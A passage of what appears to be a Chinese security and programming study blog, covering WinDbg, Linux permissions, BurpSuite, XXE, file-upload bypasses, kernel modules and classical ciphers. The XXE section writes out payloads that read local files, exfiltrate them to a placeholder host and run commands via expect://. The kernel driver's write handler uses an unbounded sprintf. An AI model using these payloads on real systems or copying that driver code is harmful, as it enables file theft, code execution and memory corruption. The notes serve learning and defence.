MASM表达式可以使用+,-,*,/算术运算符和一些类似转型运算符. 使用hi/low获得一个32位数的高/低16位. 使用by/wo获得指定地址处的BYTE/WORD. 使用dwo/pwo获得指定地址处的DWORD/QWORD. 使用poi可以获得指定地址处的指针长度的数据. 同时WinDbg还定义了一些特殊的运算符,以$开头. $fnsucc(FnAddress, RetVal, Flag):将RetVal作为位于FnAddress处函数的返回值.如果返回值位成功码则$fnsucc返回TRUE. $iment(Address):返回加载模块列表中的映像入口点地址. $scmp(str1, str2):字符串比较,同strcmp. $sicmp(str1, str2):同stricmp. $spat(str1, Pattern):匹配. $vvalid(Address, Length):判断起始地址位Address,长度为Length的内存是否有效.有效返回1. 在C++表达式中可以使用C++的各种操作符,且表达式中数值默认作为十进制解析,使用0x前缀指定十六进制解析. WinDbg支持两种加入注释的方法:*后所有内容被当成注释;$$后的注释以分号结束. 流程控制语句 .if,.else,.elif,.do,.while,.for,.continue,.break,.block(用于定义代码块). 扩展模块 WinDbg自带一部分扩展模块,其位于WinDbg的安装目录下,并在WinDbg启动时默认加载. 可以加载一些其他的扩展模块,首先使用_NT_DEBUGGER_EXTENSION_PATH环境变量或者.extpath ExtensionPath来设置搜索路径. .load(DLL):加载扩展模块.等同于! module.extension. .unload(DLL):卸载扩展模块. .chain(List Debugger Extensions):显示已加载的调试扩展及搜索顺序.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operations-Linux-文件属性与权限]]></title>
    <url>%2Fposts%2F903016ad%2F</url>
    <content type="text"><![CDATA[文件属性与权限 Linux是一个多用户,多用户组,多任务的系统,Linux李账号,密码,用户组信息分别保存在/etc/passwd,/etc/shadow,/etc/group文件中. Linux文件属性中的权限分为文件所有者,用户组和其他人三个隔离的权限组.使用ls -al可以查看这些属性. 1drwxr-xr-x 4 root root 4096 Aug 30 16:53 .cache 第一列有十个字符,第一个字符代表文件的类型,-代表普通文件,d代表目录,l代表连接文件,b代表设备文件中可供存储的接口设备,c代表设备文件中的串行端口设备,p代表管道文件,s代表套接字文件. 接下来九个字符分三组,分别代表文件所有者,用户组和其他人的rwx权限,-代表没有此权限. 第二列表示有多少文件名连接到此节点(i-node).第三列表示此文件的所有者.第四列表示此文件的所属用户组.第五列为该文件的大小(单位B).第六列为此文件最近的修改日期(增加--full-time显示详细时间).第七列即文件名. 修改 12345chgrp [-R] groupname filename/dirname#改变文件所属用户组#-R表示递归执行,连同子目录与其下的所有文件chown [-R] username[:groupname] filename/dirname#改变文件所有者,可以顺带改变文件所属用户组,也可以只改变文件所属用户组 改变文件权限使用chmod. 1234chmod [-R] xyz filename/dirname#xyz三个数字代表对应三组权限的二进制数,653-&gt;rw-r-x-wxchmod [-R] u=r,g+w,o-x filename/dirname#u-&gt;user,g-&gt;group,o-&gt;others,a-&gt;all.+-=对应原来的意思. 权限的意义 对于文件. r:可读取此文件的实际内容. w:可以编辑,新增该文件的内容(不能删除). x:具有被系统执行的权限. 对于目录. r:具有读取目录结构列表的权限,比如可以使用ls. w:具有更改目录结构列表的权限,比如新建/删除/重命名/移动文件或子目录. x:用户进入该目录使其成为工作目录的权限,比如可以使用cd.]]></content>
      <categories>
        <category>CS</category>
        <category>operations</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-tool-BurpSuite]]></title>
    <url>%2Fposts%2F17e76bc2%2F</url>
    <content type="text"><![CDATA[概览 BurpSuite是一个基于Java环境的Web应用测试工具.可以对请求的数据包进行拦截和修改,扫描常见的Web安全漏洞,暴力破解登录表单,遍历数据等等. 目录速览. Target:测试目标的列表的概览. Proxy:代理设置,抓取数据包. Spider:应用智能感应的网络爬虫,抓取Web应用程序的链接和内容等. Scanner:扫描Web应用程序漏洞,发现常见Web安全漏洞,存在误报. Intruder:进行Web应用程序模糊测试,进行暴力猜解等. Repeater:对数据包进行重放,用于分析服务器返回情况,判断修改参数的影响. Sequencer:检查Web应用程序提供的会话令牌的随机性,并执行各种测试. Decoder:对数据进行加解密操作,包含url,html,base64等等. Comparer:执行任意的两个请求,响应或任何其它形式的数据之间可视化的比较. Extender:加载扩展,使用自己或第三方代码来扩展BurpSuite的功能. Options:设置. Alerts:存放报错信息. 使用HTTPS 代理访问http://burp/cert,将证书下载,浏览器导入证书即可. Proxy Proxy功能下有四个子项,Intercept,Options,HTTP histroy,WebSockets history. Intercept相关功能. Forward:将抓取或修改后的数据包发送到服务器端. Drop:丢弃抓取到的数据包. Intercept is on/off:是否拦截数据包,on表示拦截. Action:对该数据包进行操作,同一数据包处右击和Action效果相同. Histroy:记录设置代理后浏览器访问的页面数据包,详细记录数据包的host,method等.对每个请求可以看请求包和响应包信息,也可以发送到其他模块使用.点击上面的Filter可以过滤请求. Options:主要用于设置代理监听请求和响应,拦截响应等等. Intercept Client Requests:配置拦截规则,可以是域名,IP,协议,method,URL等等. Intercept Server Responses:配置拦截规则,基于服务器端的返回情况进行匹配. Intruder Intruder功能下有四个子项,Target,Positions,Payloads,Options. Positions用于选择攻击模式. sniper:对变量依次进行暴力破解. battering ram:对变量同时进行破解. pitchfork:每一个变量标记对应一个字典进行破解. cluster bomb:每个变量对应一个字典,并且进行交叉式破解,尝试各种组合.适用于用户名加密码的破解. 在数据包窗口选择要进行暴力破解的参数,用$包含参数值,表示对该值进行枚举. Payloads对参数设置payload.Payload类型可选择字典方式,爆破方式等 Options设置参数. Request Engine设置请求的线程数,超时重试时间. Grep Match从响应包中提取某些结果,如果匹配成功,则在攻击结果中添加的新列中标明. Grep Extract用于提取响应消息中的有用信息,此选项是从返回包中提取有用的信息. Grep Payloads用于提取响应消息中是否包含Payload的值,比如验证反射性XSS脚本是否成功.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-XXE-基础]]></title>
    <url>%2Fposts%2F481d8dbb%2F</url>
    <content type="text"><![CDATA[概览 XXE(XML External Entity Injection)全称为XML外部实体注入.在解析外部实体的过程中,XML解析器可以根据URL中指定的方案(协议)来查询各种网络协议和服务(DNS,FTP,HTTP,SMB等),攻击者可以通过构造恶意输入达成目的. PHP中有XXE漏洞的标志性函数为simplexml_load_string(),会解析外部实体. XML XML(可扩展标记语言)被设计用来传输和存储数据,XML文档结构包括XML声明,DTD文档类型定义(可选),文档元素. 1234567891011&lt;?xml version="1.0"?&gt;&lt;!-- XML声明 --&gt;&lt;!DOCTYPE message [ &lt;!--定义此文档是message类型的文档--&gt; &lt;!ELEMENT message (msg)&gt; &lt;!--定义message元素有1个子元素--&gt; &lt;!ELEMENT msg (#PCDATA)&gt; &lt;!--定义msg元素为PCDATA类型--&gt;]&gt;&lt;!-- DTD文档类型定义 --&gt;&lt;message&gt; &lt;msg&gt;This is an amazing book&lt;/msg&gt;&lt;/message&gt;&lt;!-- XML文档元素 --&gt; DTD定义XML文档构建模块,使用一系列元素来定义文档的结构.DTD可被成行地声明于XML文档中(内部引用),也可进行外部引用. 1234&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root1 [ ... ]&gt;&lt;!DOCTYPE root2 SYSTEM "xxx.dtd"&gt;&lt;!-- 外部引用 --&gt; DTD文档中重要的关键字:DOCTYPE(DTD的声明);ENTITY(实体的声明);SYSTEM,PUBLIC(外部资源申请). 定义元素为ANY说明接受任何元素.实体可以分成内部实体和外部实体(按定义位置),也可以分为普通实体和参数实体(按定义方式). 内部实体在DTD中定义,可在XML文档中引用;参数实体只能在DTD中申明,DTD中引用. 参数实体还能嵌套定义,但内层定义的参数实体%需要进行HTML转义为&amp;#x25(&amp;#37). 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe1 "test" &gt; &lt;!ENTITY % xxe2 SYSTEM "file://a:/tools/Apache24/htdocs/test.dtd" &gt; %xxe2;]&gt;&lt;!-- &lt;!DOCTYPE foo PUBLIC "publicId" "URI"&gt; --&gt;&lt;foo&gt; &amp;xxe1; &amp;xxe3;&lt;/foo&gt; c:/test.dtd. 12&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!ENTITY xxe3 "test2"&gt; 不同XML解析器支持的协议不一样. 利用 对于直接解析的并有回显的,可以读取任意文件. 12345678&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "file://a:/tools/Apache24/htdocs/test.php" &gt;]&gt;&lt;foo&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/foo&gt; CDATA 如果要读取的文件有特殊符号,XML解析时就会报错.在XML中可以通过CDATA节将这些特殊字符当做原始的内容处理,&lt;![CDATA[ *** ]]&gt;. 12345678910&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE roottag [ &lt;!ENTITY % start "&lt;![CDATA["&gt; &lt;!ENTITY % text SYSTEM "file://d:/test.txt"&gt; &lt;!ENTITY % end "]]&gt;"&gt; &lt;!ENTITY % dtd SYSTEM "file://a:/tools/Apache24/htdocs/test.dtd"&gt; %dtd;]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; my.dtd. 12&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!ENTITY all "&amp;#37;start;&amp;#37;text;&amp;#37;end;"&gt; 数据发送 正常服务一般是没有回显的,通过请求将数据泄露. 123456&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://ip/my.dtd"&gt; %remote; %int; %send;]&gt; my.dtd. 12&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999?p=%file;'&gt;"&gt; 远程代码执行 12345678&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "expect://id" &gt; &lt;!-- expect协议 --&gt;]&gt;&lt;foo&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/foo&gt; 防御 禁用外部实体. PHP:libxml_disable_entity_loader(true);. Java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false);. 禁用关键字:SYSTEM,DOCTYPE,ENTITY.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-文件上传漏洞]]></title>
    <url>%2Fposts%2Fb902fdfa%2F</url>
    <content type="text"><![CDATA[概览 文件上传漏洞是web安全中经常利用到的一种漏洞形式,属于攻击数据与代码分离原则的一种攻击. 一些web应用程序允许上传图片,文本或者其他资源到指定的位置. 文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中,再通过url去访问以执行代码. 漏洞成因 上传文件的后缀名没有做限制;上传文件的MIMETYPE没有检查;web server对于上传文件或者指定目录的行为没有做限制等. 发现 对于文件上传漏洞的防护也有很多.前端限制基本无用,修改页面,禁用JS或者burp抓包修改即可. 服务端的检查绕过如下. 对于检查Content-Type(MIMETYPE),使用工具强行篡改Header即可. 对于分析文件头内容来检查文件类型,给上传脚本加上相应的幻数字节即可.php引擎会将&lt;?之前的内容当作html文本. 对于通过黑白名单检查后缀,webserver中存在解析漏洞. IIS5.x-6.x中的目录解析漏洞,/.asp/目录下的一切内容都会被当作asp脚本解析. IIS5.x-6.x中的分号漏洞,IIS在解析文件名的时候可能将分号后面的内容丢弃.如a.asp;.jpg. IIS7/7.5+PHP中如果存在1.jpg,可用1.jpg/1.php形式访问并以php执行. 旧版Windows Server中存在空格和dot漏洞,类似于a.php.和a.php这样的文件名存储后会被windows去掉点和空格. Nginx 0.8.7之前存在空字节漏洞,xxx.jpg%00.php这样的文件名会被解析为php代码运行. apache的解析漏洞,上传如a.php.rar,a.php.gif类型的文件名,由于apache在解析文件名的时候是从右向左读,如果遇到不能识别的扩展名则跳过.rar等扩展名是apache不能识别的. 对于黑名单,还可以后缀大小写绕过,空格绕过,空字符截断等. 同时Web系统还支持其他后缀的解析. 对于限制Web Server对于特定类型文件的行为,可以通过文件上传覆盖对应的配置文件绕过(如.htaccess,修改内容为AddType application/x-http-php .jpg,上传的jpg均以php执行). 常见WAF绕过. 大小上限,WAF对校验的用户数据设置大小上限,此时可以构造一个大文件的木马,前面填充垃圾内容. 针对早期版本的安全狗,可以多加一个filename来绕过. upload-labs upload-labs. 12sudo docker pull c0ny1/upload-labssudo docker run -d -p 80:80 c0ny1/upload-labs:latest Pass-01 前端限制,直接控制台覆写js函数function checkFile() {return true;}.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-FrontEnd-DataURI]]></title>
    <url>%2Fposts%2Fee32b8d7%2F</url>
    <content type="text"><![CDATA[概念 URI(Uniform Resource Identifier):统一资源标识符,服务器资源名被称为统一资源标识符. URL(Uniform Resource Locator):统一资源定位符,描述了一台特定服务器上某资源的特定位置. URN(Uniform Resource Name):统一资源名称. URL,URN是URI的子集. Data URI scheme允许使用内联的方式在网页中包含数据,目的是将一些小的数据,直接嵌入到网页中,从而不用再从外部文件载入. 使用 Data URI scheme支持类型. 123456789101112data:,#文本数据data:text/plain,#文本数据data:text/html,#HTML代码data:text/html;base64,#base64编码的HTML代码data:text/css,#CSS代码data:text/css;base64,#base64编码的CSS代码data:text/javascript,#Javascript代码data:text/javascript;base64,#base64编码的Javascript代码data:image/gif;base64,#base64编码的gif图片数据data:image/png;base64,#base64编码的png图片数据data:image/jpeg;base64,#base64编码的jpeg图片数据data:image/x-icon;base64,#base64编码的icon图片数据 内嵌式. 1&lt;img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAWCAYAAAArdgcFAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAABSUlEQVQ4Ee1VPUsDQRB9s3dBRCRNQvCjkDQW/hJ/gb9AOwWDoIXFgYXYXGP+hYW1/gIr7WzsE8VGxZBcwt04dznCJWw2twtWutXMmzdvlrd7t4SZVbvi1ZihZuCFqT9A/B7Qd5FI44RpPcQpE1oC1IsEq5jRBeGyc0zXaV8mvhbyOREurIRMZMZhp0VthYB9mXBi4jrUztIev1bNbKg6CMxvIWwg5GWVDOHNZ7lX6l/wrG+Fzbh/ca1bf9QWBhKtHznobgtjKF92ZBL3TUWpRbK7LhiVCY8kY3xK/iTiexNcEywSXxKBrfHvrdBN2JRsp4BoQ3dbtHLT4K+JqxWw8vr4YDaf+vR+SmXRWw99lT9N96VaypIYtwgoyWyJRtiX3T+X7TXxROcxGeAo5chlyNcBVxrb2JVpTUHsz4IQi/DL6wPucENxqvoDx69PXP8OKn4AAAAASUVORK5CYII="/&gt; URL式. 1data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAWCAYAAAArdgcFAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAABSUlEQVQ4Ee1VPUsDQRB9s3dBRCRNQvCjkDQW/hJ/gb9AOwWDoIXFgYXYXGP+hYW1/gIr7WzsE8VGxZBcwt04dznCJWw2twtWutXMmzdvlrd7t4SZVbvi1ZihZuCFqT9A/B7Qd5FI44RpPcQpE1oC1IsEq5jRBeGyc0zXaV8mvhbyOREurIRMZMZhp0VthYB9mXBi4jrUztIev1bNbKg6CMxvIWwg5GWVDOHNZ7lX6l/wrG+Fzbh/ca1bf9QWBhKtHznobgtjKF92ZBL3TUWpRbK7LhiVCY8kY3xK/iTiexNcEywSXxKBrfHvrdBN2JRsp4BoQ3dbtHLT4K+JqxWw8vr4YDaf+vR+SmXRWw99lT9N96VaypIYtwgoyWyJRtiX3T+X7TXxROcxGeAo5chlyNcBVxrb2JVpTUHsz4IQi/DL6wPucENxqvoDx69PXP8OKn4AAAAASUVORK5CYII= CSS里使用Data URL. 12345.striped_box&#123; /* ... */ background-image: url("data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7");&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-Linux-LKM-入门]]></title>
    <url>%2Fposts%2Fdd706e48%2F</url>
    <content type="text"><![CDATA[概览 可加载内核模块(LKM)是Linux内核运行时加载和移除代码的机制. 可加载内核模块在运行时加载,不运行在用户空间,本质上是内核的一部分. 编写简单内核模块 首先要安装Linux内核头文件. 12apt-cache search linux-headers-$(uname -r)sudo apt-get install linux-headers-$(uname -r) 内核模块不是应用程序,没有main()函数.其类似于共享库,有以下特点. 非顺序执行,内核模块使用初始化函数将自身注册.内核模块处理的请求在模块代码中定义.这与事件驱动编程模型类似. 无自动清理,任何由内核模块申请的内存,必须在模块卸载时手动释放. 内核代码无法访问为Linux用户空间编写的库(如printf).内核模块运行在内核空间,有自己独立的地址空间.内核模块可以通过printk()函数输出信息. 会被中断,内核模块可能会同时被多个程序/进程使用.构建内核模块时需确保在发生中断的时候行为一致和正确. 更高级的执行特权,通常内核模块会比用户空间程序分配更多的CPU周期. 无浮点支持,对用户空间应用,内核代码使用trap来实现整数到浮点模式的转换. 一个简单的内核模块. 12345678910111213141516171819202122232425262728293031//test.c#include &lt;linux/init.h&gt; //用于标记函数的宏,如 __init,__exit.#include &lt;linux/module.h&gt; //加载内核模块到内核使用的核心头文件.#include &lt;linux/kernel.h&gt; //包含内核使用的类型,宏和函数.MODULE_LICENSE("GPL");//许可类型,影响运行时行为.MODULE_AUTHOR("w4rd3n");MODULE_DESCRIPTION("simple module");MODULE_VERSION("0.1");static char * name = "go go go!!!";module_param(name, charp, S_IRUGO);//module_param(name, type, permissions).//type:byte,int,uint,long,ulong,short,ushort,bool,invbool,charp.//permissions:http://www.gnu.org/software/libc/manual/html_node/Permission-Bits.htmlMODULE_PARM_DESC(name, "demo");static int __init go_init(void) &#123; printk(KERN_INFO "init:%s\n", name); //KERN_INFO指定了消息的优先级 return 0;&#125;static void __exit go_exit(void) &#123; printk(KERN_INFO "exit:%s\n", name);&#125;module_init(go_init);module_exit(go_exit);//注册初始化与清理函数. 对应Makefile. 123456obj-m := test.oall: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean 编写字符设备驱动 字符设备通常和用户应用程序双向传输数据,类似管道和串行接口,即时从字符流中读写字节数据. 字符设备的一种替代是块设备,块设备的行为类似普通文件,允许程序查看缓存数据中的缓冲队列,或是通过读,写等函数进行操作.两种设备类型都可以通过关联到文件系统树上的设备文件进行访问. 设备驱动有关联的主设备号和次设备号.主设备号用于内核在设备访问时能够识别正确的设备驱动,次设备号的角色和设备相关,,主要使用在驱动中. 在/dev目录中执行ls可以看见每个设备的主次设备号. file_operations数据结构定义在/linux/fs.h头文件中,用于保存驱动中的函数指针,允许开发者定义文件操作行为.在线资料. 设备驱动有一个类名和设备名,设备最终显示在文件系统的/sys/class/&lt;className&gt;/&lt;facilityName&gt;中. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/device.h&gt; //支持内核驱动模型#include &lt;linux/kernel.h&gt;#include &lt;linux/fs.h&gt; //支持Linux文件系统#include &lt;asm/uaccess.h&gt; //复制到用户空间函数需要的头文件#include &lt;linux/uaccess.h&gt;#define DEVICE_NAME "mychar"//设备将会展示在/dev/mychar#define CLASS_NAME "w4rd3n"//设备类名,字符设备驱动 MODULE_LICENSE("GPL");MODULE_AUTHOR("w4rd3n");MODULE_DESCRIPTION("simple module");MODULE_VERSION("0.1");static int majorNumber;//主设备号static char message[256] = &#123;0&#125;;//保存从用户空间传输过来的字符串static short size_of_message;//保存的字符串长度 static int numberOpens = 0;//设备打开次数static struct class* mycharClass = NULL;//设备驱动类结构体指针 static struct device* mycharDevice = NULL;//设备驱动设备结构体指针 static int dev_open(struct inode *, struct file *);static int dev_release(struct inode *, struct file *);static ssize_t dev_read(struct file *, char *, size_t, loff_t *);static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);//字符设备操作的函数原型,必须在结构体定义前定义static struct file_operations fops = &#123; .open = dev_open, .read = dev_read, .write = dev_write, .release = dev_release,&#125;;//实现回调函数static int __init mychar_init(void) &#123; printk(KERN_INFO "mychar: Initializing the mychar LKM\n"); majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops); //尝试为这个设备动态生成一个主设备号 if (majorNumber &lt; 0) &#123; printk(KERN_ALERT "mychar failed to register a major number\n"); return majorNumber; &#125; printk(KERN_INFO "mychar: registered correctly with major number %d\n", majorNumber); mycharClass = class_create(THIS_MODULE, CLASS_NAME); //注册设备类 if (IS_ERR(mycharClass)) &#123; unregister_chrdev(majorNumber, DEVICE_NAME); printk(KERN_ALERT "Failed to register device class\n"); return PTR_ERR(mycharClass); &#125; printk(KERN_INFO "mychar: device class registered correctly\n"); mycharDevice = device_create(mycharClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME); //注册设备驱动 if (IS_ERR(mycharDevice)) &#123; class_destroy(mycharClass); unregister_chrdev(majorNumber, DEVICE_NAME); printk(KERN_ALERT "Failed to create the device\n"); return PTR_ERR(mycharDevice); //PTR_ERR()定义于linux/err.h头文件中的函数,用于从指针中抽取出错误码 &#125; printk(KERN_INFO "mychar: device class created correctly\n"); return 0;&#125;static void __exit mychar_exit(void) &#123; device_destroy(mycharClass, MKDEV(majorNumber, 0)); //移除设备 class_unregister(mycharClass); //注销设备类 class_destroy(mycharClass); //移除设备类 unregister_chrdev(majorNumber, DEVICE_NAME); //注销主设备号 printk(KERN_INFO "mychar: Goodbye from the LKM!\n");&#125;static int dev_open(struct inode * inodep, struct file * filep) &#123; numberOpens++; printk(KERN_INFO "mychar: Device has been opened %d time(s)\n", numberOpens); return 0;&#125;static ssize_t dev_read(struct file * filep, char * buffer, size_t len, loff_t * offset) &#123; int error_count = 0; error_count = copy_to_user(buffer, message, size_of_message); if (error_count == 0) &#123; printk(KERN_INFO "mychar: Sent %d characters to the user\n", size_of_message); return (size_of_message = 0); &#125; else &#123; printk(KERN_INFO "mychar: Failed to send %d characters to the user\n", error_count); return -EFAULT; &#125;&#125;static ssize_t dev_write(struct file * filep, const char * buffer, size_t len, loff_t * offset)&#123; sprintf(message, "%s(%d letters)", buffer, len); size_of_message = strlen(message); printk(KERN_INFO "mychar: Received %d characters from the user\n", len); return len;&#125;static int dev_release(struct inode * inodep, struct file * filep)&#123; printk(KERN_INFO "mychar: Device successfully closed\n"); return 0;&#125;module_init(mychar_init);module_exit(mychar_exit); 对应Makefile. 123456obj-m := mychar.oall: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean 该内核模块加载后就可以作为一个字符设备被打开. 1234567891011121314151617181920212223242526272829303132333435363738//test.c#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;errno.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;static char receive[256];int main()&#123; int ret, fd; char stringToSend[256]; fd = open("/dev/mychar", O_RDWR); if (fd &lt; 0) &#123; perror("Failed to open the device..."); return errno; &#125; printf("Type in a short string to send to the kernel module:\n"); scanf("%[^\n]%*c", stringToSend); printf("Writing message to the device [%s].\n", stringToSend); ret = write(fd, stringToSend, strlen(stringToSend)); if (ret &lt; 0) &#123; perror("Failed to write the message to the device."); return errno; &#125; printf("Press ENTER to read back from the device...\n"); getchar(); printf("Reading from the device...\n"); ret = read(fd, receive, 256); if (ret &lt; 0) &#123; perror("Failed to read the message from the device."); return errno; &#125; printf("The received message is: [%s]\n", receive); return 0;&#125; scanf函数的参数参数表示读取到第一个\n字符为止. 此时的驱动设备还存在权限问题和竞争问题,权限问题可以通过修改设备权限解决,竞争问题可以通过互斥锁解决.]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-crypto-古典密码-总览]]></title>
    <url>%2Fposts%2F38cee585%2F</url>
    <content type="text"><![CDATA[简单替换密码 以每个明文字母被与之唯一对应且不同的字母替换的方式实现的,是混乱的,可以利用词频分析解密. Base Base64,Base32,Base16可以分别编码转化8位字节为6位,5位,4位.16,32,64分别表示用多少个字符来编码. Base64编码要求把3个8位字节转化为4个6位的字节,之后在6位的前面补两个0.6位2进制能表示64个字符.Base32,Base16类似. 1234567import base64base64.b64encode(str)base64.b64decode(str)base64.b32encode(str)base64.b32decode(str)base64.b16encode(str)base64.b16decode(str) base91在线加密. XXencode &amp;&amp; UUencode XXencode以每三个字节为单位进行编码,不够的用零补齐.三个字节共24个Bit以6bit为单位分为4个组.同Base64基本一致,只是映射表不一样.UUencode也是一样. XXencode, UUencode在线加解密. Quoted-printable 任何一个8位的字节值可编码为3个字符,一个=后跟随两个十六进制数字表示该字节的数值.例如:ASCII码换页符(12)可以表示为=0C,等号(61)必须表示为=3D(避免歧义).除了可打印ASCII字符与换行符以外,所有字符必须表示为这种格式. Quoted-printable编码的数据的每行长度不能超过76个字符.为满足此要求又不改变被编码文本,在QP编码结果的每行末尾加上软换行(soft line break).即在每行末尾加上一个=. Quoted-printable在线加解密. aaencode 一种颜文字加密,直接在浏览器console中运行即可.在线加密. ppencode perl语言的一种加密,perl运行即可.在线加密. JSFuck 利用js特性的一种加密,浏览器控制台运行即可.在线加密. Brainfuck/Ook! 两种奇奇怪怪的编程语言,在线加解密. URL编码 又叫百分号编码,是统一资源定位(URL)编码方式.编码方法即在该字节ascii码的的16进制字符前面加%.URL编码在线加解密. Unicode编码 Unicode编码有四种编码方式.&amp;#x[Hex];,&amp;#[Decimal];,\U[Hex],\U+[Hex].Unicode编码在线加解密. Escape编码 又叫%u编码,采用UTF-16BE模式,Escape编码就是字符对应UTF-16的16进制表示方式前面加%u.Escape编码在线加解密. HTML实体编码 手册. 敲击码 敲击码(Tap code)通过使用一系列的点击声音来编码.基于5 × 5方格波利比奥斯方阵来实现的. 123456 1 2 3 4 51 A B C/K D E2 F G H I J 3 L M N O P4 Q R S T U5 V W X Y Z 莫尔斯电码 莫尔斯电码(Morse Code)通过通和断不同的排列顺序来表达不同英文字母,数字和标点符号的信号代码,莫尔斯电码主要由5种代码组成:.,-,空格表示停顿,/划分中等的停顿,句子之间长的停顿.莫尔斯电码在线加解密. 培根密码 在线加解密. 01248 该密码又称为云影密码,使用0,1,2,4,8四个数字,其中0用来表示间隔,其他数字以加法可以表示出如:28 = 10,124 = 7,18 = 9,再用1 -&gt; 26表示A -&gt; Z. 栅栏密码 栅栏密码(Rail-fence Cipher)把要加密的明文分成N个一组,然后把每组的第1个字符组合,每组第2个字符组合...每组的第N(最后一个分组可能不足N个)个字符组合,全部连接起来就是密文.栅栏密码在线加解密. 曲路密码 移位密码 字符串长度为24,将字符串分成4组,每六个一组. 1234567891011216534lf5&#123;ag024c483549d7fd@@1&#125;123456flag&#123;52048c453d794df1&#125;@@ 埃特巴什码 以字母倒序排列作为特殊密钥的替换加密. 12ABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBA 凯撒密码 凯撒密码(Caesar Cipher或称恺撒加密,恺撒变换,变换加密,位移加密)是一种替换加密,明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文.加密解密链接. 还有一种基于密钥的凯撒密码,其基本原理是将密钥的每一位转换为数字(一般转化为字母表对应顺序的数字),分别以这一数字为密钥加密明文的每一位字母. ROT5/13/18/47 传送门. 仿射密码 仿射密码(Affine Cipher)是一种单表代换密码,字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值,再把对应数值转换成字母. 每一个字母都是通过函数(ax + b) mod m加密,其中B是位移量,为了保证仿射密码的可逆性,a和m需要满足gcd(a, m) = 1,一般m为设置为26. 只需要根据给出的a获取其关于模m计算的逆元a',然后(x - b) * a' mod m即可解密. 双密码(Bifid Cipher) 双密码用2个密钥进行加密,由法国Felix Delastelle发明.示例密阵. 123456 1 2 3 4 51| p h q g m2| e a y l n3| o f d x k4| r c v s z5| w b u t i/j 设Period为5,明文THEQUICKBROWNFOX经过密阵转换. 123451215 54354 35233342133 52521 1152145121542133 5435452521 3523311521 34WETEDTKZNEKYOMEX 传送门. Four-Square Cipher 传送门. 电脑键盘QWE 电脑键盘QWE加密法,就是用字母表替换键盘上面的排列顺序,Q -&gt; A. 手机键盘密码 两位数字来表示字母,例如:ru用手机键盘表示就是:7382. 电脑键盘棋盘 https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others-zh/#_25. 文本加密/汉字加密 传送门. 中文电码 传送门. 希尔密码 希尔密码是运用基本矩阵论原理的替换密码,每个字母当作26进制数字:A = 0, B = 1, C = 2, .... 一串字母当成n维向量,跟一个n x n的矩阵相乘,再将得出的结果模26. 